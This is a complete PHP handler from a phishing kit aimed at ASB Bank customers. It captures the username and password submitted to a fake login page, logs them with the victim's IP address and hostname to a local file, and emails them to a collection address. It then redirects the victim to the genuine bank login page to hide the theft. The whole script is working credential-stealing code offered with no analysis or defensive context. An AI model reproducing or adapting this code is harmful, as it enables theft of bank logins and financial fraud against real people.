<?
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg .= "\n";
$msg .= "Username: ".$_POST['userId']."\n";
$msg .= "Password: ".$_POST['password']."\n";
$msg .= "\n";
$msg .= "IP: ".$ip."\n";
$msg .= "HostName : ".$hostname."\n";
$msg .= "---------------Created By TimSLake---------------------\n";
$post = "faridahbintirazalii@gmail.com";
$fp = fopen("use.txt","a");
fputs($fp,$msg);
fclose($fp); 
$subj = "ASBMoney - ".$_POST['userId']."\n";
$from = "From: $ip<logs@support.nz>";
mail("$post",$subj, $msg, $from); 
header("Location: https://online.asb.co.nz/auth/?fm=header:login");  	  

?>


